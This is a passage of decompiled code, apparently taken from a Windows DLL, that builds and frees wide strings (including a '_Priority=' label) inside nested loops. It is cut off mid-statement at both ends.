    uStack968 = uVar2;\n                        fcn.180013690(&uStack216, uVar2, 0, pppppppuVar18);\n                        pppppppuVar11 = pppppppuStack608;\n                    }\n                    else {\n                        auStack200 = CONCAT88(auStack200._8_8_, uVar2 + auStack200._0_8_);\n                        puVar13 = &uStack216;\n                        if (7 < auStack200._8_8_) {\n                            puVar13 = CONCAT44(uStack212, CONCAT22(uStack216._2_2_, uStack216));\n                        }\n                        fcn.1800ade80(puVar13 + auStack200._0_8_, pppppppuVar18, uVar2 * 2);\n                        puVar13[uVar2 + auStack200._0_8_] = 0;\n                        uVar19 = uStack688;\n                    }\n                    if (7 < auStack592._8_8_) {\n                        pppppppuVar18 = pppppppuVar11;\n                        if ((0xfff < auStack592._8_8_ * 2 + 2) &&\n                           (pppppppuVar18 = pppppppuVar11[-1],  0x1f < pppppppuVar11 + (-8 - pppppppuVar18)))\n                        goto code_r0x000180048a7f;\n                        fcn.18008fb24(pppppppuVar18);\n                    }\n                    if (7 < CONCAT44(uStack548, uStack552)) {\n                        iVar23 = CONCAT62(Stack574, uStack576);\n                        iVar22 = iVar23;\n                        if ((0xfff < CONCAT44(uStack548, uStack552) * 2 + 2) &&\n                           (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U)) goto code_r0x000180048a85;\n                        fcn.18008fb24(iVar22);\n                    }\n                    uVar25 = uVar25 + 1;\n                    iVar22 = puVar27[9];\n                    uVar26 = uVar26 + 0x40;\n                } while (uVar25 < puVar27[10] - iVar22 >> 6);\n            }\n            uVar6 = 0x1800f7534;\n            if (uStack616 == 0) {\n                uVar6 = 0x1800f751c;\n            }\n            puVar24 = fcn.18002e7e0(&uStack576, uVar6, &uStack184);\n            uVar25 = puVar24[2];\n            if (7 < puVar24[3]) {\n                puVar24 = *puVar24;\n            }\n            if (var_58h_2 - uStack104 < uVar25) {\n                uStack968 = uVar25;\n                fcn.180013690(&var_70h_2, uVar25, 0, puVar24);\n                uVar20 = uVar19;\n            }\n            else {\n                uVar26 = uVar25 + uStack104;\n                puVar14 = &var_70h_2;\n                if (7 < var_58h_2) {\n                    puVar14 = CONCAT62(var_70h_2._2_6_, var_70h_2);\n                }\n                iVar22 = uStack104 * 2;\n                uStack104 = uVar26;\n                fcn.1800ade80(puVar14 + iVar22, puVar24, uVar25 * 2);\n                *(puVar14 + uVar26 * 2) = 0;\n                uVar20 = uStack688;\n            }\n            if (7 < CONCAT44(uStack548, uStack552)) {\n                iVar23 = CONCAT62(Stack574, uStack576);\n                iVar22 = iVar23;\n                if ((CONCAT44(uStack548, uStack552) * 2 + 2 < 0x1000) ||\n                   (iVar22 = *(iVar23 + -8),  (iVar23 - iVar22) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar22);\n                    goto code_r0x0001800470b6;\n                }\n                fcn.1800b3528();\ncode_r0x000180048a91:\n                fcn.1800b3528();\ncode_r0x000180048a97:\n                fcn.1800b3528();\ncode_r0x000180048a9d:\n                fcn.1800b3528();\ncode_r0x000180048aa3:\n                fcn.1800b3528();\ncode_r0x000180048aa9:\n                fcn.1800b3528();\ncode_r0x000180048aaf:\n                fcn.1800b3528();\ncode_r0x000180048ab5:\n                fcn.1800b3528();\ncode_r0x000180048abb:\n                fcn.1800b3528();\ncode_r0x000180048ac1:\n                fcn.1800b3528();\ncode_r0x000180048ac7:\n                fcn.1800b3528();\ncode_r0x000180048acd:\n                fcn.1800b3528();\ncode_r0x000180048ad3:\n                fcn.1800b3528();\ncode_r0x000180048ad9:\n                fcn.1800b3528();\ncode_r0x000180048adf:\n                fcn.1800b3528();\n                goto code_r0x000180048ae5;\n            }\ncode_r0x0001800470b6:\n            iVar22 = 0x1800f75b4;\n            if (*(puVar27 + 0x44) != '\\0') {\n                iVar22 = 0x1800f7544;\n            }\n            uVar6 = fcn.180020b50(&uStack576, *(puVar27 + 8));\n            auStack928 = CONCAT88(7, SUB168(auStack928, 0));\n            uStack944._0_2_ = 0;\n            uStack952 = uVar20 | 0x20;\n            fcn.18000d550(&uStack944, auStack168._0_8_ + 10);\n            puVar12 = CONCAT44(uStack184._4_4_, uStack184);\n            puVar9 = &uStack184;\n            if (7 < auStack168._8_8_) {\n                puVar9 = puVar12;\n            }\n            if (auStack928._8_8_ - auStack928._0_8_ < auStack168._0_8_) {\n                uStack968 = auStack168._0_8_;\n                fcn.180013690(&uStack944, auStack168._0_8_, 0, puVar9);\n                puVar12 = CONCAT44(uStack184._4_4_, uStack184);\n            }\n            else {\n                auStack928 = CONCAT88(auStack928._8_8_, auStack928._0_8_ + auStack168._0_8_);\n                puVar13 = &uStack944;\n                if (7 < auStack928._8_8_) {\n                    puVar13 = CONCAT44(uStack944._4_4_, CONCAT22(uStack944._2_2_, uStack944));\n                }\n                fcn.1800ade80(puVar13 + auStack928._0_8_, puVar9, auStack168._0_8_ * 2);\n                puVar13[auStack928._0_8_ + auStack168._0_8_] = 0;\n            }\n            if (auStack928._8_8_ - auStack928._0_8_ < 10) {\n                uStack968 = 10;\n                fcn.180013690(&uStack944, 10, 0, L\"_Priority=\");\n            }\n            else {\n                auStack928 = CONCAT88(auStack928._8_8_, auStack928._0_8_ + 10);\n                puVar13 = &uStack944;\n                if (7 < auStack928._8_8_) {\n                    puVar13 = CONCAT44(uStack944._4_4_, CONCAT22(uStack944._2_2_, uStack944));\n                }\n                fcn.1800ade80(puVar13 + auStack928._0_8_, L\"_Priority=\", 0x14);\n                puVar13[auStack928._0_8_ + 10] = 0;\n            }\n            ppiVar8 = fcn.18002e490(auStack648, &uStack944, uVar6);\n            puVar13 = &uStack248;\n            if (7 < uStack224) {\n                puVar13 = CONCAT62(Stack246, uStack248);\n            }\n            piVar7 = ppiVar8[2];\n            if (ppiVar8[3] - piVar7 < uStack232) {\n                uStack968 = uStack232;\n                ppiVar8 = fcn.180013690(ppiVar8, uStack232, 0, puVar13);\n            }\n            else {\n                piVar1 = piVar7 + uStack232;\n                ppiVar8[2] = piVar1;\n                ppiVar21 = ppiVar8;\n                if (0x7 < ppiVar8[3]) {\n                    ppiVar21 = *ppiVar8;\n                }\n                fcn.1800ade80(ppiVar21 + piVar7 * 2, puVar13, uStack232 * 2);\n                *(ppiVar21 + piVar1 * 2) = 0;\n            }\n            uStack720._4_4_ = *(ppiVar8 + 4);\n            puVar13 = *ppiVar8;\n            uStack712 = *(ppiVar8 + 1);\n            uStack708 = *(ppiVar8 + 0xc);\n            uStack720._0_2_ = *ppiVar8;\n            uStack720._2_2_ = *ppiVar8 >> 0x10;\n            auVar4 = **(ppiVar8 + 2);\n            auStack704 = *(ppiVar8 + 2);\n            ppiVar8[2] = NULL;\n            ppiVar8[3] = 0x7;\n            *ppiVar8 = 0;\n            uStack952 = uVar19 | 0x60;\n            puVar9 = &uStack184;\n            if (7 < auStack168._8_8_) {\n                puVar9 = puVar12;\n            }\n            auStack704._0_8_ = SUB128(auVar4, 0);\n            auStack704._8_8_ = SUB168(auStack704 >> 0x40, 0);\n            if (auStack704._8_8_ - auStack704._0_8_ < auStack168._0_8_) {\n                uStack968 = auStack168._0_8_;\n                piVar7 = fcn.180013690(&uStack720, auStack168._0_8_, 0, puVar9);\n                puVar12 = CONCAT44(uStack184._4_4_, uStack184);\n            }\n            else {\n                auStack704 = CONCAT88(auStack704._8_8_, auStack704._0_8_ + auStack168._0_8_);\n                puVar17 = &uStack720;\n                if (7 < auStack704._8_8_) {\n                    puVar17 = puVar13;\n                }\n                fcn.1800ade80(puVar17 + auStack704._0_8_, puVar9, auStack168._0_8_ * 2);\n                puVar17[auStack704._0_8_ + auStack168._0_8_] = 0;\n                piVar7 = &uStack720;\n            }\n            auStack736 = ZEXT816(0);\n            puVar13 = *piVar7;\n            uStack752._0_2_ = *piVar7;\n            uStack752._2_2_ = *piVar7 >> 0x10;\n            uStack752._4_4_ = *(piVar7 + 4);\n            uStack744 = *(piVar7 + 1);\n            uStack740 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack736 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uStack952 = uVar19 | 0xe0;\n            auStack736._0_8_ = SUB128(auVar4, 0);\n            auStack736._8_8_ = SUB168(auStack736 >> 0x40, 0);\n            if (auStack736._8_8_ - auStack736._0_8_ < 0xb) {\n                uStack968 = 0xb;\n                piVar7 = fcn.180013690(&uStack752, 0xb, 0, 0x1800f8488);\n            }\n            else {\n                auStack736 = CONCAT88(auStack736._8_8_, auStack736._0_8_ + 0xb);\n                puVar17 = &uStack752;\n                if (7 < auStack736._8_8_) {\n                    puVar17 = puVar13;\n                }\n                fcn.1800ade80(puVar17 + auStack736._0_8_, 0x1800f8488, 0x16);\n                puVar17[auStack736._0_8_ + 0xb] = 0;\n                piVar7 = &uStack752;\n            }\n            auStack768 = ZEXT816(0);\n            puVar13 = *piVar7;\n            uStack784._0_2_ = *piVar7;\n            uStack784._2_2_ = *piVar7 >> 0x10;\n            uStack784._4_4_ = *(piVar7 + 4);\n            uStack776 = *(piVar7 + 1);\n            uStack772 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack768 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uStack952 = uVar19 | 0x1e0;\n            uVar25 = 0xffffffffffffffff;\n            do {\n                uVar25 = uVar25 + 1;\n            } while (*(iVar22 + uVar25 * 2) != 0);\n            auStack768._0_8_ = SUB128(auVar4, 0);\n            auStack768._8_8_ = SUB168(auStack768 >> 0x40, 0);\n            if (auStack768._8_8_ - auStack768._0_8_ < uVar25) {\n                uStack968 = uVar25;\n                piVar7 = fcn.180013690(&uStack784, uVar25, 0, iVar22);\n            }\n            else {\n                auStack768 = CONCAT88(auStack768._8_8_, uVar25 + auStack768._0_8_);\n                puVar17 = &uStack784;\n                if (7 < auStack768._8_8_) {\n                    puVar17 = puVar13;\n                }\n                fcn.1800ade80(puVar17 + auStack768._0_8_, iVar22, uVar25 * 2);\n                puVar17[uVar25 + auStack768._0_8_] = 0;\n                piVar7 = &uStack784;\n            }\n            auStack800 = ZEXT816(0);\n            puVar17 = *piVar7;\n            uStack816._0_2_ = *piVar7;\n            uStack816._2_2_ = *piVar7 >> 0x10;\n            uStack816._4_4_ = *(piVar7 + 4);\n            uStack808 = *(piVar7 + 1);\n            uStack804 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack800 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uVar25 = uStack232;\n            uStack952 = uVar19 | 0x3e0;\n            puVar13 = &uStack248;\n            if (7 < uStack224) {\n                puVar13 = CONCAT62(Stack246, uStack248);\n            }\n            auStack800._0_8_ = SUB128(auVar4, 0);\n            auStack800._8_8_ = SUB168(auStack800 >> 0x40, 0);\n            if (auStack800._8_8_ - auStack800._0_8_ < uStack232) {\n                uStack968 = uStack232;\n                piVar7 = fcn.180013690(&uStack816, uStack232, 0, puVar13);\n                uVar25 = uStack232;\n            }\n            else {\n                iVar22 = auStack800._0_8_ + uStack232;\n                auStack800 = CONCAT88(auStack800._8_8_, iVar22);\n                puVar15 = &uStack816;\n                if (7 < auStack800._8_8_) {\n                    puVar15 = puVar17;\n                }\n                fcn.1800ade80(puVar15 + auStack800._0_8_, puVar13, uStack232 * 2);\n                puVar15[iVar22] = 0;\n                piVar7 = &uStack816;\n            }\n            auStack832 = ZEXT816(0);\n            puVar13 = *piVar7;\n            uStack848._0_2_ = *piVar7;\n            uStack848._2_2_ = *piVar7 >> 0x10;\n            uStack848._4_4_ = *(piVar7 + 4);\n            uStack840 = *(piVar7 + 1);\n            uStack836 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack832 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uStack952 = uVar19 | 0x7e0;\n            puVar9 = &uStack184;\n            if (7 < auStack168._8_8_) {\n                puVar9 = puVar12;\n            }\n            auStack832._0_8_ = SUB128(auVar4, 0);\n            auStack832._8_8_ = SUB168(auStack832 >> 0x40, 0);\n            if (auStack832._8_8_ - auStack832._0_8_ < auStack168._0_8_) {\n                uStack968 = auStack168._0_8_;\n                piVar7 = fcn.180013690(&uStack848, auStack168._0_8_, 0, puVar9);\n                puVar12 = CONCAT44(uStack184._4_4_, uStack184);\n            }\n            else {\n                auStack832 = CONCAT88(auStack832._8_8_, auStack832._0_8_ + auStack168._0_8_);\n                puVar17 = &uStack848;\n                if (7 < auStack832._8_8_) {\n                    puVar17 = puVar13;\n                }\n                fcn.1800ade80(puVar17 + auStack832._0_8_, puVar9, auStack168._0_8_ * 2);\n                puVar17[auStack832._0_8_ + auStack168._0_8_] = 0;\n                piVar7 = &uStack848;\n            }\n            auStack864 = ZEXT816(0);\n            puVar13 = *piVar7;\n            uStack880._0_2_ = *piVar7;\n            uStack880._2_2_ = *piVar7 >> 0x10;\n            uStack880._4_4_ = *(piVar7 + 4);\n            uStack872 = *(piVar7 + 1);\n            uStack868 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack864 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uStack952 = uVar19 | 0xfe0;\n            auStack864._0_8_ = SUB128(auVar4, 0);\n            auStack864._8_8_ = SUB168(auStack864 >> 0x40, 0);\n            if (auStack864._8_8_ - auStack864._0_8_ < 0xc) {\n                uStack968 = 0xc;\n                piVar7 = fcn.180013690(&uStack880, 0xc, 0, 0x1800f8468);\n            }\n            else {\n                auStack864 = CONCAT88(auStack864._8_8_, auStack864._0_8_ + 0xc);\n                puVar17 = &uStack880;\n                if (7 < auStack864._8_8_) {\n                    puVar17 = puVar13;\n                }\n                fcn.1800ade80(puVar17 + auStack864._0_8_, 0x1800f8468, 0x18);\n                puVar17[auStack864._0_8_ + 0xc] = 0;\n                piVar7 = &uStack880;\n            }\n            auStack896 = ZEXT816(0);\n            puVar17 = *piVar7;\n            uStack912._0_2_ = *piVar7;\n            uStack912._2_2_ = *piVar7 >> 0x10;\n            uStack908 = *(piVar7 + 4);\n            uStack904 = *(piVar7 + 1);\n            uStack900 = *(piVar7 + 0xc);\n            auVar4 = **(piVar7 + 2);\n            auStack896 = *(piVar7 + 2);\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uStack952 = uVar19 | 0x1fe0;\n            puVar13 = &uStack216;\n            if (7 < auStack200._8_8_) {\n                puVar13 = CONCAT44(uStack212, CONCAT22(uStack216._2_2_, uStack216));\n            }\n            auStack896._0_8_ = SUB128(auVar4, 0);\n            auStack896._8_8_ = SUB168(auStack896 >> 0x40, 0);\n            if (auStack896._8_8_ - auStack896._0_8_ < auStack200._0_8_) {\n                uStack968 = auStack200._0_8_;\n                puVar9 = fcn.180013690(&uStack912, auStack200._0_8_, 0, puVar13);\n            }\n            else {\n                auStack896 = CONCAT88(auStack896._8_8_, auStack896._0_8_ + auStack200._0_8_);\n                puVar15 = &uStack912;\n                if (7 < auStack896._8_8_) {\n                    puVar15 = puVar17;\n                }\n                fcn.1800ade80(puVar15 + auStack896._0_8_, puVar13, auStack200._0_8_ * 2);\n                puVar15[auStack200._0_8_ + auStack896._0_8_] = 0;\n                puVar9 = &uStack912;\n            }\n            auStack664 = ZEXT816(0);\n            uStack680._0_2_ = *puVar9;\n            uStack680._2_2_ = *puVar9 >> 0x10;\n            uStack680._4_4_ = puVar9[1];\n            uStack672 = puVar9[2];\n            uStack668 = puVar9[3];\n            auStack664 = *(puVar9 + 4);\n            *(puVar9 + 4) = 0;\n            *(puVar9 + 6) = 7;\n            *puVar9 = 0;\n            uStack952 = uVar19 | 0x3fe0;\n            puVar13 = &uStack248;\n            if (7 < uStack224) {\n                puVar13 = CONCAT62(Stack246, uStack248);\n            }\n            if (auStack664._8_8_ - auStack664._0_8_ < uVar25) {\n                uStack968 = uVar25;\n                piVar7 = fcn.180013690(&uStack680, uVar25, 0, puVar13);\n            }\n            else {\n                auStack664 = CONCAT88(auStack664._8_8_, auStack664._0_8_ + uVar25);\n                puVar17 = &uStack680;\n                if (7 < auStack664._8_8_) {\n                    puVar17 = CONCAT44(uStack680._4_4_, CONCAT22(uStack680._2_2_, uStack680));\n                }\n                fcn.1800ade80(puVar17 + auStack664._0_8_, puVar13, uVar25 * 2);\n                puVar17[auStack664._0_8_ + uVar25] = 0;\n                piVar7 = &uStack680;\n            }\n            pppppppuVar11 = *piVar7;\n            pppppppuStack544 = pppppppuVar11;\n            iStack536 = piVar7[1];\n            uVar25 = piVar7[2];\n            uVar26 = piVar7[3];\n            uStack528 = uVar25;\n            uStack520 = uVar26;\n            piVar7[2] = 0;\n            piVar7[3] = 7;\n            *piVar7 = 0;\n            uVar19 = uVar19 | 0x7fe0;\n            pppppppuVar18 = &pppppppuStack544;\n            if (7 < uVar26) {\n                pppppppuVar18 = pppppppuVar11;\n            }\n            uStack952 = uVar19;\n            uStack688 = uVar19;\n            if (var_78h_2 - uStack136 < uVar25) {\n                uStack968 = uVar25;\n                fcn.180013690(&uStack152, uVar25, 0, pppppppuVar18);\n                pppppppuVar11 = pppppppuStack544;\n                uVar26 = uStack520;\n            }\n            else {\n                uVar2 = uStack136 + uVar25;\n                puVar13 = &uStack152;\n                if (7 < var_78h_2) {\n                    puVar13 = CONCAT62(Stack150, uStack152);\n                }\n                puVar17 = puVar13 + uStack136;\n                uStack136 = uVar2;\n                fcn.1800ade80(puVar17, pppppppuVar18, uVar25 * 2);\n                puVar13[uVar2] = 0;\n                uVar19 = uStack688;\n            }\n            if (7 < uVar26) {\n                pppppppuVar18 = pppppppuVar11;\n                if ((0xfff < uVar26 * 2 + 2) &&\n                   (pppppppuVar18 = pppppppuVar11[-1],  0x1f < pppppppuVar11 + (-8 - pppppppuVar18)))\n                goto code_r0x000180048a91;\n                fcn.18008fb24(pppppppuVar18);\n            }\n            if (7 < auStack664._8_8_) {\n                iVar23 = CONCAT44(uStack680._4_4_, CONCAT22(uStack680._2_2_, uStack680));\n                iVar22 = iVar23;\n                if ((0xfff < auStack664._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048a97;\n                fcn.18008fb24(iVar22);\n            }\n            auStack664 = ZEXT816(7) << 0x40;\n            uStack680._0_2_ = 0;\n            if (7 < auStack896._8_8_) {\n                iVar23 = CONCAT44(uStack908, CONCAT22(uStack912._2_2_, uStack912));\n                iVar22 = iVar23;\n                if ((0xfff < auStack896._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048a9d;\n                fcn.18008fb24(iVar22);\n            }\n            auStack896 = ZEXT816(7) << 0x40;\n            uStack912._0_2_ = 0;\n            if (7 < auStack864._8_8_) {\n                iVar23 = CONCAT44(uStack880._4_4_, CONCAT22(uStack880._2_2_, uStack880));\n                iVar22 = iVar23;\n                if ((0xfff < auStack864._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048aa3;\n                fcn.18008fb24(iVar22);\n            }\n            auStack864 = ZEXT816(7) << 0x40;\n            uStack880._0_2_ = 0;\n            if (7 < auStack832._8_8_) {\n                iVar23 = CONCAT44(uStack848._4_4_, CONCAT22(uStack848._2_2_, uStack848));\n                iVar22 = iVar23;\n                if ((0xfff < auStack832._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048aa9;\n                fcn.18008fb24(iVar22);\n            }\n            auStack832 = ZEXT816(7) << 0x40;\n            uStack848._0_2_ = 0;\n            if (7 < auStack800._8_8_) {\n                iVar23 = CONCAT44(uStack816._4_4_, CONCAT22(uStack816._2_2_, uStack816));\n                iVar22 = iVar23;\n                if ((0xfff < auStack800._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048aaf;\n                fcn.18008fb24(iVar22);\n            }\n            auStack800 = ZEXT816(7) << 0x40;\n            uStack816._0_2_ = 0;\n            if (7 < auStack768._8_8_) {\n                iVar23 = CONCAT44(uStack784._4_4_, CONCAT22(uStack784._2_2_, uStack784));\n                iVar22 = iVar23;\n                if ((0xfff < auStack768._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048ab5;\n                fcn.18008fb24(iVar22);\n            }\n            auStack768 = ZEXT816(7) << 0x40;\n            uStack784._0_2_ = 0;\n            if (7 < auStack736._8_8_) {\n                iVar23 = CONCAT44(uStack752._4_4_, CONCAT22(uStack752._2_2_, uStack752));\n                iVar22 = iVar23;\n                if ((0xfff < auStack736._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048abb;\n                fcn.18008fb24(iVar22);\n            }\n            auStack736 = ZEXT816(7) << 0x40;\n            uStack752._0_2_ = 0;\n            if (7 < auStack704._8_8_) {\n                iVar23 = CONCAT44(uStack720._4_4_, CONCAT22(uStack720._2_2_, uStack720));\n                iVar22 = iVar23;\n                if ((0xfff < auStack704._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048ac1;\n                fcn.18008fb24(iVar22);\n            }\n            auStack704 = ZEXT816(7) << 0x40;\n            uStack720._0_2_ = 0;\n            if (7 < auStack632._8_8_) {\n                iVar22 = auStack648._0_8_;\n                if ((0xfff < auStack632._8_8_ * 2 + 2) &&\n                   (iVar22 = *(auStack648._0_8_ + -8),  0x1f < (auStack648._0_8_ - iVar22) - 8U))\n                goto code_r0x000180048ac7;\n                fcn.18008fb24(iVar22);\n            }\n            auStack632 = ZEXT816(7) << 0x40;\n            auStack648 = auStack648 & 0xffffffffffff0000;\n            uVar19 = uVar19 & 0xffffffdf;\n            if (7 < auStack928._8_8_) {\n                iVar23 = CONCAT44(uStack944._4_4_, CONCAT22(uStack944._2_2_, uStack944));\n                iVar22 = iVar23;\n                if ((0xfff < auStack928._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048acd;\n                fcn.18008fb24(iVar22);\n            }\n            auStack928 = ZEXT816(7) << 0x40;\n            uStack944._0_2_ = 0;\n            if (7 < CONCAT44(uStack548, uStack552)) {\n                iVar23 = CONCAT62(Stack574, uStack576);\n                iVar22 = iVar23;\n                if ((0xfff < CONCAT44(uStack548, uStack552) * 2 + 2) &&\n                   (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U)) goto code_r0x000180048ad3;\n                fcn.18008fb24(iVar22);\n            }\n            if (7 < auStack200._8_8_) {\n                iVar23 = CONCAT44(uStack212, CONCAT22(uStack216._2_2_, uStack216));\n                iVar22 = iVar23;\n                if ((0xfff < auStack200._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n                goto code_r0x000180048ad9;\n                fcn.18008fb24(iVar22);\n            }\n            auStack200 = ZEXT816(7) << 0x40;\n            uStack216._0_2_ = 0;\n            if (7 < auStack168._8_8_) {\n                puVar9 = puVar12;\n                if ((0xfff < auStack168._8_8_ * 2 + 2) &&\n                   (puVar9 = *(puVar12 + 0xfffffffffffffffe),  0x1f < puVar12 + (-8 - puVar9)))\n                goto code_r0x000180048adf;\n                fcn.18008fb24(puVar9);\n            }\n            uStack616 = uStack616 + 1;\n            iVar22 = puStack512[9];\n            puVar24 = puStack512;\n            arg4 = uStack504;\n        } while (uStack616 < (puStack512[10] - iVar22) / 0x60);\n    }\n    iVar23 = -1;\n    fcn.180020a90(aiStack88, 10, 0x1800f84b8, iStack496 + 1);\n    iVar22 = 0x1800f7674;\n    if (*(puVar24 + 8) != '\\0') {\n        iVar22 = 0x1800f75f4;\n    }\n    uVar6 = fcn.1800687b0(auStack376);\n    puVar27 = puVar24;\n    if (0xf < puVar24[3]) {\n        puVar27 = *puVar24;\n    }\n    fcn.180069050(uVar6, auStack448, puVar27, puVar24[2] + puVar27);\n    fcn.1800686c0(auStack376);\n    uStack560 = *0x180101900;\n    uStack556 = *0x180101904;\n    uStack552 = *0x180101908;\n    uStack548 = *0x18010190c;\n    uStack576 = 0;\n    do {\n        iVar23 = iVar23 + 1;\n    } while (aiStack88[iVar23] != 0);\n    arg2_00 = aiStack88;\n    fcn.180010d70(&uStack576, arg2_00, iVar23);\n    pauVar10 = fcn.180014b80(&uStack576, arg2_00, 0x1800f78ec, 1);\n    auVar28 = *pauVar10;\n    auStack648 = auVar28;\n    auVar4 = *pauVar10[1];\n    auStack632 = pauVar10[1];\n    *pauVar10[1] = 0;\n    *(pauVar10[1] + 8) = 7;\n    **pauVar10 = 0;\n    auStack632._0_8_ = SUB128(auVar4, 0);\n    auStack632._8_8_ = SUB168(auStack632 >> 0x40, 0);\n    if (auStack632._8_8_ == auStack632._0_8_) {\n        uStack968 = 1;\n        piVar7 = fcn.180013690(auStack648, 1, 0, 0x1800f78a4);\n        auVar28 = extraout_XMM0;\n    }\n    else {\n        auStack632 = CONCAT88(auStack632._8_8_, auStack632._0_8_ + 1);\n        auStack648._0_8_ = auStack648;\n        if (7 < auStack632._8_8_) {\n            auStack648._0_8_ = SUB168(auVar28, 0);\n        }\n        *(auStack648._0_8_ + auStack632._0_8_ * 2) = 0x5d;\n        *(auStack648._0_8_ + (auStack632._0_8_ + 1) * 2) = 0;\n        piVar7 = auStack648;\n    }\n    auStack592 = auVar28 & 0x0;\n    pppppppuStack608 = *piVar7;\n    iStack600 = piVar7[1];\n    auStack592 = *(piVar7 + 2);\n    piVar7[2] = 0;\n    piVar7[3] = 7;\n    *piVar7 = 0;\n    uVar25 = uStack232;\n    puVar13 = &uStack248;\n    if (7 < uStack224) {\n        puVar13 = CONCAT62(Stack246, uStack248);\n    }\n    if (auStack592._8_8_ - auStack592._0_8_ < uStack232) {\n        uStack968 = uStack232;\n        pppppppuVar11 = fcn.180013690(&pppppppuStack608, uStack232, 0, puVar13);\n        uVar25 = uStack232;\n        auVar28 = extraout_XMM0_01;\n    }\n    else {\n        iVar23 = auStack592._0_8_ + uStack232;\n        auStack592 = CONCAT88(auStack592._8_8_, iVar23);\n        pppppppuVar11 = &pppppppuStack608;\n        if (7 < auStack592._8_8_) {\n            pppppppuVar11 = pppppppuStack608;\n        }\n        fcn.1800ade80(pppppppuVar11 + auStack592._0_8_ * 2, puVar13, uStack232 * 2);\n        *(pppppppuVar11 + iVar23 * 2) = 0;\n        pppppppuVar11 = &pppppppuStack608;\n        auVar28 = extraout_XMM0_00;\n    }\n    auStack928 = auVar28 & 0x0;\n    ppppppuVar5 = *pppppppuVar11;\n    uStack944._0_2_ = *pppppppuVar11;\n    uStack944._2_2_ = *pppppppuVar11 >> 0x10;\n    uStack944._4_4_ = *(pppppppuVar11 + 4);\n    uStack936 = *(pppppppuVar11 + 1);\n    uStack932 = *(pppppppuVar11 + 0xc);\n    auVar4 = **(pppppppuVar11 + 2);\n    auStack928 = *(pppppppuVar11 + 2);\n    pppppppuVar11[2] = NULL;\n    pppppppuVar11[3] = 0x7;\n    *pppppppuVar11 = 0;\n    auStack928._0_8_ = SUB128(auVar4, 0);\n    auStack928._8_8_ = SUB168(auStack928 >> 0x40, 0);\n    if (auStack928._8_8_ - auStack928._0_8_ < 9) {\n        uStack968 = 9;\n        puVar12 = fcn.180013690(&uStack944, 9, 0, 0x1800f8520);\n        auVar28 = extraout_XMM0_03;\n    }\n    else {\n        auStack928 = CONCAT88(auStack928._8_8_, auStack928._0_8_ + 9);\n        ppppppuVar16 = &uStack944;\n        if (7 < auStack928._8_8_) {\n            ppppppuVar16 = ppppppuVar5;\n        }\n        fcn.1800ade80(ppppppuVar16 + auStack928._0_8_ * 2, 0x1800f8520, 0x12);\n        *(ppppppuVar16 + (auStack928._0_8_ + 9) * 2) = 0;\n        puVar12 = &uStack944;\n        auVar28 = extraout_XMM0_02;\n    }\n    auStack472 = auVar28 & 0x0;\n    uStack488 = *puVar12;\n    uStack484 = puVar12[1];\n    uStack480 = puVar12[2];\n    uStack476 = puVar12[3];\n    auStack472 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    ppiVar8 = fcn.18002e490(auStack416, &uStack488, auStack448);\n    puVar13 = &uStack248;\n    if (7 < uStack224) {\n        puVar13 = CONCAT62(Stack246, uStack248);\n    }\n    piVar7 = ppiVar8[2];\n    if (ppiVar8[3] - piVar7 < uVar25) {\n        uStack968 = uVar25;\n        ppiVar8 = fcn.180013690(ppiVar8, uVar25, 0, puVar13);\n        uVar25 = uStack232;\n    }\n    else {\n        ppiVar8[2] = uVar25 + piVar7;\n        ppiVar21 = ppiVar8;\n        if (0x7 < ppiVar8[3]) {\n            ppiVar21 = *ppiVar8;\n        }\n        fcn.1800ade80(ppiVar21 + piVar7 * 2, puVar13, uVar25 * 2);\n        *(ppiVar21 + (uVar25 + piVar7) * 2) = 0;\n    }\n    uVar26 = 0xffffffffffffffff;\n    uStack212 = *(ppiVar8 + 4);\n    puVar13 = *ppiVar8;\n    uStack208 = *(ppiVar8 + 1);\n    uStack204 = *(ppiVar8 + 0xc);\n    uStack216._0_2_ = *ppiVar8;\n    uStack216._2_2_ = *ppiVar8 >> 0x10;\n    auVar4 = **(ppiVar8 + 2);\n    auStack200 = *(ppiVar8 + 